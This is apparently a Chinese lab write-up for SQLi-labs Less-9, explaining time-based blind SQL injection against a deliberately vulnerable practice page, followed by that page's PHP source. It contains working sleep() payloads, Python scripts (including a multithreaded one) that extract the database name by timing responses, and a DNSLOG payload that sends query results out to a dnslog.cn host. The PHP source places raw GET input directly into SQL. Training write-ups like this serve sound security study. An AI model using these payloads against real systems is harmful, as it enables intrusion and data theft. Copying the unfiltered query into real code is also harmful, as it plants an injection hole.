# Less-9 **GET Blind- Time based- Single Quotes- String**
TAG：基于时间的注入、GET型注入、字符型注入、DNSLOG注入

## 漏洞利用  
![less9_1](images/Less9_1.png)
根据less名提示，这是基于时间的注入  
简单测试发现，无论输入什么都会出现正确提示
![less9_2](images/Less9_3.png)
就算输入一定会返回错误的语句也没有任何改变  
![less9_3](images/Less9_2.png)
这是就要考虑基于时间的注入了  
payload: ```?id=1' and if(length(database())=8,sleep(5),0) --+```   
这里会发现注入后网页的加载了一会，如果  
payload:```?id=1' and if(length(database())=7,sleep(5),0) --+```  
就会很快加载完成，说明数据库名长度为8  
这就是基于时间注入的简单利用  
现在可以编写脚本来进行基于时间的注入了  
获取数据库名长度的脚本：
```
import requests
url = "http://192.168.232.146/Less-9/?id=1' and if(length(database())={_},sleep(5),0) --+"
#注意一下这里使用>去作为判断条件

flag =8

for  i  in range(1,15):  #循环次数根据所探测数据
    payload = url.format(_=i)
    html = requests.get(payload)
    time = html.elapsed.total_seconds() #获取响应时间
    print(payload)
    if time >= 5:
        print(flag)
        break;
```

探测数据库名的脚本：
```
import requests
url = "http://192.168.232.146/Less-9/?id=1' and if(ascii(substr((select database()),{_},1))>{__},sleep(5),0) --+"
#注意一下这里使用>去作为判断条件

flag =''

for  i  in range(1,15):  #循环次数根据所探测数据
    min = 65
    max = 122
    while abs(max - min) > 1:
        mid = (max + min)//2
        payload = url.format(_=i,__=mid)
        html = requests.get(payload)
        time = html.elapsed.total_seconds() #获取响应时间
        print(payload)
        if time >= 5:
            min = mid
        else:
            max = mid

    flag += chr(max)
    print(flag)
```
这个脚本探测了数据库名，但是花费时间较多  
我们可以考虑用多线程脚本来进行探测
```
import requests
import threading
url = "http://192.168.232.146/Less-9/?id=1' and if(ascii(substr((select database()),{_},1))>{__},sleep(5),0) --+"
#注意一下这里使用>去作为判断条件


class TheThread(threading.Thread):
    def __init__(self,func,args=()):
        super(TheThread,self).__init__()
        self.func = func
        self.args = args
    def run(self):
        self.result = self.func(self.args)
    def get_result(self):
        try:
            return self.result
        except Exception:
            return None

def payload(i):
    min = 65
    max = 122
    while abs(max - min) > 1:
        mid = (max + min)//2
        payload = url.format(_=i,__=mid)
        html = requests.get(payload)
        time = html.elapsed.total_seconds() #获取响应时间
        print(payload)
        if time >=5:
            min = mid
        else:
            max = mid
    return chr(max)
li = []

def main():
    flag = ''
    for i in range(1, 9):  # 循环次数根据所探测数据
        t = TheThread(payload,args=i)
        li.append(t)
        t.start()
    for t in li:
        t.join()
        flag += t.get_result()
        print(flag)
if __name__ == '__main__':
    main()
```
但是基于时间的注入会受到网络状态的影响，在网络环境不佳的情况下很难获得正确的数据，需要多次测试来获得正确数据，并且耗时非常的长  

可以使用DNSLOG注入来进行基于时间注入的代替  
DOSLOG原理：
![less9_3](images/Less9_4.jpg)
示例payload:  
```?id=1' and if((select load_file(concat('\\\\',(payload),'.xxxxxx.dnslog.cn\\abc'))),1,1)--+```   


## 源码分析  
### less9源码： 
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-9 Blind- Time based- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);

// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-9.jpg" /></center>
</body>
</html>

``` 

### 漏洞点分析：  
从此less的代码来看，并不存在查询结果与报错信息的输出，也不会在查询后对查询结果的正确与否进行显示，但是缺失相应的过滤措施导致了基于时间的注入与DNSLOG注入  